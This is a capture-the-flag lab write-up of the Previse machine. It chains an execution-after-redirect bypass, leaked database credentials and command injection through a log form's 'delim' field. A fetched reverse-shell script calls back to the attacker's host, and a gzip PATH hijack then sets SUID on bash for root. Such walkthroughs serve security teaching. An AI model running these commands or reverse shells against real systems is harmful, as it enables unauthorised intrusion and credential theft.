![Previse.PNG](/assets/Machines/Easy/Previse/Previse.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.104
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.104
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit webpage

![web.PNG](/assets/Machines/Easy/Previse/web.PNG)


4. Do directory fuzzing with wfuzz
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Previse]
└─# wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://previse.htb/FUZZ.php/
```

* Put **.php** extension because web is built with this programming laguaje

**Output**
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   302        71 L     164 W      2801 Ch     "index"                            
000000003:   302        0 L      0 W        0 Ch        "download"                
000000315:   200        5 L      14 W       217 Ch      "footer"              
000000039:   200        53 L     138 W      2224 Ch     "login"  
000000080:   302        130 L    317 W      6073 Ch     "files" 
000000732:   302        74 L     176 W      2970 Ch     "status" 
000001144:   302        0 L      0 W        0 Ch        "logout"
000001388:   200        0 L      0 W        0 Ch        "config"
000001293:   302        93 L     238 W      3994 Ch     "accounts"
000002112:   302        0 L      0 W        0 Ch        "logs" 
000000177:   200        20 L     64 W       980 Ch      "header"
000000186:   200        31 L     60 W       1248 Ch     "nav"
```

* We find some directories but this responses are **302 Found** usually this code response meaning found the resource and try to redirect this.

* This is dangerous is target to [EAR Attack](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))


5. With BurpSuite we try to wacth responses of server, to do that you can do this:

![burp1.PNG](/assets/Machines/Easy/Previse/burp1.png)

6. Now we access in web browser to **accounts.php** and we obtain this in BurpSuite

![response.PNG](/assets/Machines/Easy/Previse/response.PNG)

* **EAR** Vulnerabilty allow change **302 Found** for **200 OK**. Change and forward petition

![web2.PNG](/assets/Machines/Easy/Previse/web2.PNG)
* We can access to web page without credentials to login

7. Now create at account to access more comfortable to web page

8. Access normal form to web page and now search important information

![file.PNG](/assets/Machines/Easy/Previse/file.PNG)

9. You might review **config.php** and **logs.php** files

* Content of **config.php** file:
```php
<?php
function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}
?>
```

* We can find credentials `root:mySQL_p@ssw0rd!:)`

* Content of **logs.php** file:
```php
...
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
...
```
* This is most important code line of this file
* With this we can execute commands in target machine like this:

![log.PNG](/assets/Machines/Easy/Previse/log.PNG)

* Intercepts petition of this part of web page with BurpSuite

![burp2.PNG](/assets/Machines/Easy/Previse/burp2.PNG)

* In this petition we can watch `delim` field in this case the value is **comma** but we can change the value for `somethig; <command to execute>`
* Sign `;` allows execute separate commands. If you remember the most important code line in **logs.php** we can watch this query is not sanitize.

10. Execute a command to obtain a reverse shell

First, create a script to do this:

* **script.sh**
```bash
#!/bin/bash

dev -i >& /dev/tcp/<tun 0 IP>/<Port> 0>&1
```

* Create a server with python
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Previse]
└─| python -m http.server 80
```

* Use curl in petition web to execute this:

![curl.PNG](/assets/Machines/Easy/Previse/curl.PNG)

* **Remember** before forward petition with BurpSuite listen with nc in port choose before

**Output**
```bash
┌──(root㉿kali)-[/home/kali/Desktop/Machines/Easy]
└─| nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.104] 48064
bash: cannot set terminal process group (1546): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$
```

11. List users
```bash
bash-4.4$ cd /home/
bash-4.4$ ls
m4lwhere
```


12. Connect to mysql with previous credentials `root:mySQL_p@ssw0rd!:)`
```bash
bash-4.4$ mysql -uroot -p
Enter password:



Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

13. Search credentials of **m4lwhere user**
```sql
mysql> SELECT * FROM accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | EsTX123  | $1$🧂llol$G2AhKNxd48OxGyQHpyiQr. | 2022-12-29 16:19:06 |
|  3 | hamoud   | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2022-12-29 18:53:17 |
+----+----------+------------------------------------+---------------------+
```
> Credential is in **Previse Database** and **Accounts Table**


14. Crack this hash with hashcat
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Previse]
└─| hashcat -a 0 -m 500 hash /home/kali/Desktop/rockyou.txt
```

* This process take a lot time.

15. Finalized crack, the password is: `ilovecody112235!`

16. Convert in user m4lwhere and cat user flag
```bash
bash-4.4$ su m4lwhere
Password: 
bash-4.4$ whoami
m4lwhere
bash-4.4$ cd 
bash-4.4$ cat user.txt 
09ea88979add815948180f0a5a164297
```

---
---
---
### **Privileges Escalation** 💀

1. Use **sudo -l**
```bash
bash-4.4$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

2. Look previous file
```bash
bash-4.4$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

3. This file use relative path this is vulnerable to **Path Hijacking**

4. Create a file with name gzip in **tmp directory** and put this script
```bash
bash-4.4$ echo "chmod u+s /bin/bash" > gzip
```

* Put execute permission
```bash
bash-4.4$ chmod u+x gzip
```

* Now alter path with this
```bash
bash-4.4$ export PATH=/tmp:$PATH
```

* This way when `/opt/scripts/access_backup.sh` running search for **gzip** first in **/tmp directory** in this folder will find our gzip file create previously and will execute the script in this how root. 

5. Execute `/opt/scripts/access_backup.sh` how root
```bash
bash-4.4$ sudo -u root /opt/scripts/access_backup.sh
```

6. View permission of **bash**
```bash
bash-4.4$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

7. Spawn a shell how **root user**
```bash
bash-4.4$ bash -p
bash-4.4# whoami
root
```

8. Cat root flag
```bash
bash-4.4# cat /root/root.txt 
f1753dc82c7764d26acf6a2f037c3cae
```